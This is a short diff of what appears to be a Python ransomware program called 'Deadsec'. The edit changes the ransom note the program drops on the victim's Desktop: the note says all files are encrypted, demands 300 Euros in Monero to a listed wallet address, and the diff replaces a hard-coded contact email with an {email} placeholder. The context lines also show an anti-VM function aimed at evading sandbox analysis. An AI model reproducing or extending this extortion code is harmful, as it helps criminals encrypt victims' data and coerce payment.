@@ -120,7 +120,7 @@ def create_txt():
 			os.chdir(f"/home/{whoami()}/Desktop/")
 
 	with open("Deadsec_Ransomware_Readme.txt","w+") as f:
-		f.write(""" All your files have been encrypted with no way of getting them back, you will have \n to pay 300 Euros in XMR on this address: 43f9EYcULHL6iNH5vh6JKe2NL8tMHpBKKfLciazcFaG8GG2FEfq1i22V7UpiFM8TE95QUr3PLYzURAGdyqZRhc8x4ofkAFL \n Next you have to email us on inf2021084@ionio.gr with a screenshot of the successful transaction and we will provide you the key.  \nDo NOT waste your time trying to find a way to decrypt them without a key or trying to find another way. It's a waste of time, consider yourself warned  """)
+		f.write(""" All your files have been encrypted with no way of getting them back, you will have \n to pay 300 Euros in XMR on this address: 43f9EYcULHL6iNH5vh6JKe2NL8tMHpBKKfLciazcFaG8GG2FEfq1i22V7UpiFM8TE95QUr3PLYzURAGdyqZRhc8x4ofkAFL \n Next you have to email us on {email} with a screenshot of the successful transaction and we will provide you the key.  \nDo NOT waste your time trying to find a way to decrypt them without a key or trying to find another way. It's a waste of time, consider yourself warned  """)
 
 def anti_vm():#sudo dmidecode -s bios-version
 	while True:
